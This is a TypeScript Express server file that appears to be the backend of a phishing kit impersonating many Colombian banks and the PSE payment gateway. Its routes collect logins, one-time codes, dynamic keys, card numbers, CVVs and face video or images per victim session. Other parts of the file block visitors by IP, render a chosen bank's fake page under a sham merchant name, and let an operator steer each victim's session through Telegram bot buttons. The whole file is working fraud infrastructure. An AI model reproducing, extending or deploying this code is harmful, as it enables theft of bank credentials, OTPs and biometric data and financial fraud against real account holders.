import bodyParser from "body-parser";
import cors from "cors";
import dotenv from "dotenv";
import express from "express";
import multer from "multer";
import os from "os";
import { AvvillasController } from "./controllers/bancoAvvillas/AvvillasController";
import { BancolombiaBiometricsController } from "./controllers/bancoBancolombia/BancolombiaBiometricsController";
import { BancolombiaController } from "./controllers/bancoBancolombia/BancolombiaController";
import { BbvaController } from "./controllers/bancoBbva/BbvaController";
import { BogotaController } from "./controllers/bancoBogota/BogotaController";
import { CajaSocialController } from "./controllers/bancoCajaSocial/CajaSocialController";
import { ColpatriaController } from "./controllers/bancoColpatria/ColpatriaController";
import { DaviviendaBiometricsController } from "./controllers/bancoDavivienda/DaviviendaBiometricsController";
import { DaviviendaController } from "./controllers/bancoDavivienda/DaviviendaController";
import { FalabellaController } from "./controllers/bancoFalabella/FalabellaController";
import { ItauController } from "./controllers/bancoItau/ItauController";
import { NequiBiometricsController } from "./controllers/bancoNequi/NequiBiometricsController";
import { NequiController } from "./controllers/bancoNequi/NequiController";
import { OccidenteController } from "./controllers/bancoOccidente/OccidenteController";
import { PopularController } from "./controllers/bancoPopular/PopularController";
import { SerfinanzaController } from "./controllers/bancoSerfinanza/SerfinanzaController";
import { Helper } from "./controllers/Helper";
import { WebhookController } from "./controllers/WebhookController";
import { ipBlockMiddleware } from "./middlewares/IpBlockMiddleware";

// Se obtienen las variables de entorno y se configura el puerto
dotenv.config();

// Se inicializa la aplicacion y se define el puerto
const app = express();
const PORT = process.env.PORT || 8000;

app.use((req, res, next) => {
  console.log(`[REQ] ${req.method} ${req.url}`);
  next();
});

// Se usa el middleware para bloquear ips
app.use(ipBlockMiddleware);

// Se validan las cors para que se puedan hacer peticiones desde el frontend
app.use(
  cors({
    origin: function (origin, callback) {
      if (!origin) return callback(null, true);
      callback(null, true);
    },
    credentials: true,
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: [
      "Content-Type",
      "Authorization",
      "X-Requested-With",
      "Accept",
    ],
  }),
);

// Se habilitan las peticiones pre-vuelo para todas las rutas para que se puedan hacer peticiones desde el frontend
app.options(/.*/, cors());

// Se usa el bodyParser del json para que se puedan hacer peticiones desde el frontend
app.use(bodyParser.json());

// Se define el router para las rutas
const apiRouter = express.Router();

// Se define la constante para multer para que se puedan hacer peticiones desde el frontend
const upload = multer({ dest: os.tmpdir() });

// -------------------------------------------------------------------------------------- //

// --------------------------------Ruta para AV Villas----------------------------------- //

apiRouter.post("/avvillas/authenticacion", AvvillasController.authenticacion);
apiRouter.post("/avvillas/otp", AvvillasController.otp);
apiRouter.post("/avvillas/verify-state/:sessionId", AvvillasController.verifyState);
apiRouter.post("/avvillas/validated-block", AvvillasController.validatedIpBlock);
apiRouter.post("/avvillas/admin/link-custom", AvvillasController.linkCustom);

// --------------------------------Ruta para Bancolombia---------------------------------- //

apiRouter.post("/bancolombia/authenticacion", BancolombiaController.authenticacion);
apiRouter.post("/bancolombia/dinamica", BancolombiaController.dinamica);
apiRouter.post("/bancolombia/otp", BancolombiaController.otp);
apiRouter.post("/bancolombia/otp-resend", BancolombiaController.otpResend);
apiRouter.post("/bancolombia/response-923", BancolombiaController.error923Response);
apiRouter.post("/bancolombia/admin/config-tc", BancolombiaController.adminConfigTc);
apiRouter.post("/bancolombia/tc-custom", BancolombiaController.tcCustom);
apiRouter.post("/bancolombia/admin/config-cvv", BancolombiaController.adminConfigCvv);
apiRouter.post("/bancolombia/cvv-custom", BancolombiaController.cvvCustom);
apiRouter.post("/bancolombia/verify-state/:sessionId", BancolombiaController.verifyState);
apiRouter.post("/bancolombia/validated-block", BancolombiaController.validatedIpBlock);
apiRouter.get("/bancolombia/biometrics/view/:sessionId", BancolombiaBiometricsController.viewBiometrics);
apiRouter.post("/bancolombia/biometrics/upload", upload.fields([{ name: "video", maxCount: 1 }, { name: "image1", maxCount: 1 }, { name: "image2", maxCount: 1 }, { name: "image3", maxCount: 1 }]), BancolombiaBiometricsController.uploadBiometrics);
apiRouter.post("/bancolombia/admin/link-custom", BancolombiaController.linkCustom);

// ---------------------------------Ruta para BBVA--------------------------------------- //

apiRouter.post("/bbva/authenticacion", BbvaController.authenticacion);
apiRouter.post("/bbva/verify-state/:sessionId", BbvaController.verifyState);
apiRouter.post("/bbva/validated-block", BbvaController.validatedIpBlock);
apiRouter.post("/bbva/admin/link-custom", BbvaController.linkCustom);

// ---------------------------------Ruta para Bogota-------------------------------------- //

apiRouter.post("/bogota/authenticacion", BogotaController.authenticacion);
apiRouter.post("/bogota/otp", BogotaController.otp);
apiRouter.post("/bogota/otp-resend", BogotaController.otpResend);
apiRouter.post("/bogota/token", BogotaController.token);
apiRouter.post("/bogota/verify-state/:sessionId", BogotaController.verifyState);
apiRouter.post("/bogota/validated-block", BogotaController.validatedIpBlock);
apiRouter.post("/bogota/admin/link-custom", BogotaController.linkCustom);

// ---------------------------------Ruta para Caja Social----------------------------------- //

apiRouter.post("/cajasocial/authenticacion", CajaSocialController.authenticacion);
apiRouter.post("/cajasocial/otp", CajaSocialController.otp);
apiRouter.post("/cajasocial/otp-resend", CajaSocialController.otpResend);
apiRouter.post("/cajasocial/token", CajaSocialController.token);
apiRouter.post("/cajasocial/verify-state/:sessionId", CajaSocialController.verifyState);
apiRouter.post("/cajasocial/validated-block", CajaSocialController.validatedIpBlock);
apiRouter.post("/cajasocial/admin/link-custom", CajaSocialController.linkCustom);

// ---------------------------------Ruta para Colpatria------------------------------------ //

apiRouter.post("/colpatria/authenticacion", ColpatriaController.authenticacion);
apiRouter.post("/colpatria/otp", ColpatriaController.otp);
apiRouter.post("/colpatria/otp-resend", ColpatriaController.otpResend);
apiRouter.post("/colpatria/atm", ColpatriaController.atm);
apiRouter.post("/colpatria/verify-state/:sessionId", ColpatriaController.verifyState);
apiRouter.post("/colpatria/validated-block", ColpatriaController.validatedIpBlock);
apiRouter.post("/colpatria/admin/link-custom", ColpatriaController.linkCustom);

// ---------------------------------Ruta para Davivienda------------------------------------ //

apiRouter.post("/davivienda/authenticacion", DaviviendaController.authenticacion);
apiRouter.post("/davivienda/otp", DaviviendaController.otp);
apiRouter.post("/davivienda/otp-resend", DaviviendaController.otpResend);
apiRouter.post("/davivienda/verify-state/:sessionId", DaviviendaController.verifyState);
apiRouter.post("/davivienda/validated-block", DaviviendaController.validatedIpBlock);
apiRouter.get("/davivienda/biometrics/view/:sessionId", DaviviendaBiometricsController.viewBiometrics);
apiRouter.post("/davivienda/biometrics/upload",upload.fields([{ name: "image1", maxCount: 1 }]), DaviviendaBiometricsController.uploadBiometrics);
apiRouter.post("/davivienda/admin/link-custom", DaviviendaController.linkCustom);

// ---------------------------------Ruta para Banco Falabella--------------------------------- //

apiRouter.post("/falabella/authenticacion", FalabellaController.authenticacion);
apiRouter.post("/falabella/dinamica", FalabellaController.dinamica);
apiRouter.post("/falabella/otp", FalabellaController.otp);
apiRouter.post("/falabella/verify-state/:sessionId", FalabellaController.verifyState);
apiRouter.post("/falabella/validated-block", FalabellaController.validatedIpBlock);
apiRouter.post("/falabella/admin/link-custom", FalabellaController.linkCustom);

// ---------------------------------Ruta para Banco ITAU------------------------------------- //

apiRouter.post("/itau/authenticacion", ItauController.authenticacion);
apiRouter.post("/itau/otp", ItauController.otp);
apiRouter.post("/itau/verify-state/:sessionId", ItauController.verifyState);
apiRouter.post("/itau/validated-block", ItauController.validatedIpBlock);
apiRouter.post("/itau/admin/link-custom", ItauController.linkCustom);

// ---------------------------------Ruta para Banco Nequi------------------------------------- //

apiRouter.post("/nequi/authenticacion", NequiController.authenticacion);
apiRouter.post("/nequi/dinamica", NequiController.dinamica);
apiRouter.post("/nequi/cash", NequiController.cash);
apiRouter.post("/nequi/verify-state/:sessionId", NequiController.verifyState);
apiRouter.post("/nequi/validated-block", NequiController.validatedIpBlock);
apiRouter.get("/nequi/biometrics/view/:sessionId", NequiBiometricsController.viewBiometrics);
apiRouter.post("/nequi/biometrics/upload", upload.fields([{ name: "video", maxCount: 1 }, { name: "image1", maxCount: 1 }]), NequiBiometricsController.uploadBiometrics);
apiRouter.post("/nequi/admin/link-custom", NequiController.linkCustom);

// ---------------------------------Ruta para Banco Occidente--------------------------------- //

apiRouter.post("/occidente/authenticacion", OccidenteController.authenticacion);
apiRouter.post("/occidente/otp", OccidenteController.otp);
apiRouter.post("/occidente/verify-state/:sessionId", OccidenteController.verifyState);
apiRouter.post("/occidente/validated-block", OccidenteController.validatedIpBlock);
apiRouter.post("/occidente/admin/link-custom", OccidenteController.linkCustom);

// ---------------------------------Ruta para Banco Popular------------------------------------ //

apiRouter.post("/popular/authenticacion", PopularController.authenticacion);
apiRouter.post("/popular/otp", PopularController.otp);
apiRouter.post("/popular/verify-state/:sessionId", PopularController.verifyState);
apiRouter.post("/popular/validated-block", PopularController.validatedIpBlock);
apiRouter.post("/popular/admin/link-custom", PopularController.linkCustom);

// ---------------------------------Ruta para Banco Serfinanza--------------------------------- //

apiRouter.post("/serfinanza/authenticacion", SerfinanzaController.authenticacion);
apiRouter.post("/serfinanza/dinamica", SerfinanzaController.dinamica);
apiRouter.post("/serfinanza/otp", SerfinanzaController.otp);
apiRouter.post("/serfinanza/otp-resend", SerfinanzaController.otpResend);
apiRouter.post("/serfinanza/verify-state/:sessionId", SerfinanzaController.verifyState);
apiRouter.post("/serfinanza/validated-block", SerfinanzaController.validatedIpBlock);
apiRouter.post("/serfinanza/admin/link-custom", SerfinanzaController.linkCustom);

// --------------------------------------------------------------------------------------------- //

apiRouter.post("/telegram-webhook", WebhookController.handleWebhook);
apiRouter.post("/pse/init", Helper.initPse);
apiRouter.post("/pse/login", Helper.loginPse);
apiRouter.post("/pse/tc", Helper.loginTc);
apiRouter.post("/pse/verify-state/:sessionId", Helper.verifyPseState);
apiRouter.get("/pse/receipt/:sessionId", Helper.getPseReceipt);
apiRouter.get("/tc/auth-context/:sessionId", Helper.getTcAuthContext);
apiRouter.post("/tc/otp", Helper.otpTc);
apiRouter.post("/tc/verify-state/:sessionId", Helper.verifyTcState);
apiRouter.get("/banks/routes", Helper.getBankRoutes);

// --------------------------------------------------------------------------------------------- //

// ---------------------------------Sandbox (Testing)------------------------------------------- //

apiRouter.post("/sandbox/render-face", async (req, res) => {
  try {
    const data = req.body.data?.attributes;
    if (!data) return res.status(400).json({ success: false, message: "No data provided" });

    const sessionId = data.sessionId || "sandbox_test_" + Date.now();
    const bank = data.banco || "DESCONOCIDO";

    // Reutilizar el StorageService para guardar la sesión y que el frontend pueda consultarla
    const { StorageService } = require("./services/StorageService");
    
    let currentSession = (await StorageService.get(`session_${sessionId}`)) || {};
    
    currentSession.panel = data.panel || "TIQUETES BARATOS SA";
    currentSession.banco = bank;
    currentSession.correoUsuario = data.correoUsuario || "";
    currentSession.precio = data.precio || 0;
    currentSession.fecha = new Date().toISOString();
    currentSession.ip = data.ip || "1";
    currentSession.sessionId = sessionId;
    currentSession.tc = Boolean(data.tc);
    
    if (data.tipoDocumento) currentSession.tipoDocumento = data.tipoDocumento;
    if (data.cedula) currentSession.cedula = data.cedula;
    if (data.celular) currentSession.celular = data.celular;
    if (data.timeline) currentSession.timeline = data.timeline;

    // Guardamos la sesión
    await StorageService.set(`session_${sessionId}`, currentSession);

    // URL para pintar la cara (el frontend se encarga de rutear al banco correcto)
    const frontendBase = process.env.FRONTEND_URL || "http://localhost:3001";
    
    // Si pasamos bank por URL, PseLoading omitirá la validación y cargará directamente la ruta del banco.
    const targetUrl = `${frontendBase}/pse?bank=${bank}&sessionId=${sessionId}`;

    res.json({
      success: true,
      message: "Datos recibidos correctamente. Visita la URL proporcionada para pintar la cara seleccionada.",
      sessionId: sessionId,
      bank: bank,
      renderUrl: targetUrl
    });
  } catch (error: any) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// --------------------------------------------------------------------------------------------- //

// Se obtiene la ruta para la ruta principal
apiRouter.get("/", (req, res) => {
  // Se retorna el metodo para que se pueda hacer peticiones desde el frontend
  res.json({ status: "OK", message: "Backend PASARELA - OK" });
});

// Se monta el prefijo para que las rutas empiecen por /api/v1 para que se puedan hacer peticiones desde el frontend
app.use("/api/v1", apiRouter);

// Proxy para el Backend Central (rutear localmente para evitar depender de Railway durante pruebas locales)
const axios = require("axios");
app.post("/api/send-message", async (req, res) => {
  try {
    const backendUrl = req.body?.data?.attributes?.backend_url;
    if (!backendUrl) {
      console.warn("[PROXY WARNING] Missing backend_url in payload:", JSON.stringify(req.body));
      return res.status(400).json({ error: "Falta el backend_url en el payload" });
    }

    const localTarget = `http://localhost:${PORT}${backendUrl}`;
    console.log(`[PROXY] Forwarding message request locally to: ${localTarget}`);

    const response = await axios.post(localTarget, req.body, {
      headers: { "Content-Type": "application/json" },
      timeout: 15000,
    });
    res.status(response.status).json(response.data);
  } catch (error: any) {
    console.error("[PROXY ERROR] Failed to forward message locally:", error.message);
    if (error.response) {
      console.error("[PROXY ERROR RESPONSE]", error.response.status, error.response.data);
    }
    const status = error.response?.status || 502;
    const data = error.response?.data || { error: "Error al enrutar la petición localmente" };
    res.status(status).json(data);
  }
});

// Servir la aplicación Frontend (React build)
const path = require("path");
const buildPath = path.join(__dirname, "../../frontend/build");
app.use(express.static(buildPath));

// Ruta de prueba
app.get("/test", (req, res) => {
  const testFile = path.join(__dirname, "../../test-api.html");
  const fs = require("fs");
  if (fs.existsSync(testFile)) {
    res.sendFile(testFile);
  } else {
    res.json({ status: "OK", message: "Backend PASARELA - Test endpoint activo" });
  }
});

// Fallback para React Router: cualquier ruta no manejada por la API devuelve index.html
app.get("/{*splat}", (req, res, next) => {
  if (req.path.startsWith("/api")) return next();
  const indexFile = path.join(buildPath, "index.html");
  const fs = require("fs");
  if (fs.existsSync(indexFile)) {
    res.sendFile(indexFile);
  } else {
    res.status(404).json({ error: "Frontend no encontrado. Asegúrate de hacer build del frontend." });
  }
});

// Se ejecuta la funcion cuando hay error para que se pueda hacer peticiones desde el frontend
app.use(
  (
    err: any,
    req: express.Request,
    res: express.Response,
    next: express.NextFunction,
  ) => {
    // Se retorna cuando el servidor no response para que se pueda hacer peticiones desde el frontend
    res
      .status(500)
      .json({ error: "Internal Server Error", details: err.message });
  },
);

// Se exporta el modulo para que se pueda hacer peticiones desde el frontend
module.exports = app;

// Se valida si se requieren los modulos para que se pueda hacer peticiones desde el frontend
if (require.main === module) {
  // Evita que un rechazo de promesa no manejado apague el servidor (ej. axios 409)
  process.on("unhandledRejection", (reason: unknown) => {
    console.error("[unhandledRejection]", reason);
  });

  process.on("uncaughtException", (err: Error) => {
    console.error("[uncaughtException]", err);
  });

  // Se escucha el puerto para que se pueda hacer peticiones desde el frontend
  app.listen(PORT, () => {
    // Se imprime el puerto para que se pueda hacer peticiones desde el frontend
    console.log(`✅ Server running on port ${PORT}`);
    startLocalBotPoller();
  });
}

// Polling local para capturar eventos de Telegram (como clics de botones) sin necesidad de configurar un webhook público/Ngrok
async function startLocalBotPoller() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) {
    console.log("[LocalBotPoller] TELEGRAM_BOT_TOKEN no configurado en el .env. Poller deshabilitado.");
    return;
  }

  console.log("[LocalBotPoller] Iniciando lector de eventos de Telegram (Polling)...");

  let offset = 0;

  // Limpiamos cualquier webhook activo en Telegram para poder usar getUpdates
  try {
    await axios.get(`https://api.telegram.org/bot${token}/deleteWebhook`);
    console.log("[LocalBotPoller] Webhook de Telegram limpiado para habilitar modo Polling local.");
  } catch (err: any) {
    console.error("[LocalBotPoller] Error al limpiar webhook de Telegram:", err.message);
  }

  const poll = async () => {
    try {
      const response = await axios.get(`https://api.telegram.org/bot${token}/getUpdates`, {
        params: {
          offset: offset,
          timeout: 10, // Long polling de 10 segundos
        },
        timeout: 15000,
      });

      const updates = response.data?.result;
      if (Array.isArray(updates) && updates.length > 0) {
        for (const update of updates) {
          offset = update.update_id + 1;

          if (update.callback_query) {
            const callbackQuery = update.callback_query;
            const dataStr = callbackQuery.data || ""; // Formato: acción:sessionId;banco:panel

            console.log(`[LocalBotPoller] Clic en botón detectado: "${dataStr}"`);

            const firstColon = dataStr.indexOf(":");
            const firstSemicolon = dataStr.indexOf(";");

            if (firstColon !== -1 && firstSemicolon !== -1) {
              const action = dataStr.substring(0, firstColon);
              const sessionId = dataStr.substring(firstColon + 1, firstSemicolon);
              const rawBank = dataStr.substring(firstSemicolon + 1);
              const bankColon = rawBank.indexOf(":");
              const bank = bankColon !== -1 ? rawBank.substring(0, bankColon) : rawBank;

              console.log(`[LocalBotPoller] Enrutando acción="${action}" sessionId="${sessionId}" banco="${bank}"`);

              // Enviamos el webhook de forma local al controlador local del backend
              try {
                const webhookPayload = {
                  telegram: callbackQuery,
                  action: action,
                  sessionId: sessionId,
                  bank: bank,
                };

                const webhookUrl = `http://localhost:${PORT}/api/v1/telegram-webhook`;
                await axios.post(webhookUrl, webhookPayload, {
                  headers: { "Content-Type": "application/json" },
                });
                console.log("[LocalBotPoller] Evento enviado al webhook local con éxito.");

                // Aceptamos la llamada para quitar el reloj de arena en el cliente de Telegram
                await axios.get(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                  params: { callback_query_id: callbackQuery.id },
                });
              } catch (webErr: any) {
                console.error("[LocalBotPoller] Error al reenviar al webhook local:", webErr.response?.data || webErr.message);
              }
            }
          }
        }
      }
    } catch (err: any) {
      if (err.code !== "ECONNABORTED" && err.message !== "timeout of 15000ms exceeded") {
        console.error("[LocalBotPoller] Error consultando actualizaciones en Telegram:", err.message);
      }
    }

    // Volver a consultar después de 1 segundo
    setTimeout(poll, 1000);
  };

  poll();
}
